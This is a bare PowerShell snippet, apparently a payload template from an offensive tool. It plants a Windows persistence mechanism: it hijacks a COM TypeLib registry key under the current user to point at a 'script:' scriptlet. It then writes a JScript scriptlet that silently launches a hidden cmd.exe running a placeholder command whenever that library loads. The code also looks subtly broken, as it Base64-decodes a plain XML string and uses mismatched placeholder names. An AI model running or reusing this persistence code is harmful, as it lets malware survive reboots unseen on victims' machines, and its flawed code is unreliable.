$srt='{srt}';$cmd='{cdm}';if ($env:X -eq $null) {if (!(test-path $srt)) {$path='HKCU:\Software\Classes\TypeLib\{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}\1.1\0\Win64';new-item -Path $path -Force | out-null;$reg = @{Path = $path;Name = '(Default)';Value = 'script:'+$srt;type = 'string';};new-itemproperty @reg -Force | out-null;$src='<?xml version="1.0"?><scriptlet><Registration description="D" progid="R" version="1.0"></Registration><script language="JScript"><![CDATA[o_ = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\CIMV2");t_ = "SELECT Name, CommandLine FROM Win32_Process WHERE Name LIKE ''%cmd.exe'' AND CommandLine LIKE ''%/K %''";c_ = o_.ExecQuery(t_, "WQL", 0);if (c_.Count<1) {s_ = new ActiveXObject("WScript.Shell");s_.Run("cmd.exe /K set X=1&{cmd}",0);};]]></script></scriptlet>';$src=[Text.Encoding]::Unicode.GetString([System.Convert]::("FromBase64String")($src));$cmd=$cmd.replace('\','\\');$src=$src.replace('{cmd}',$cmd);set-content -Path $srt -Value $src;};};
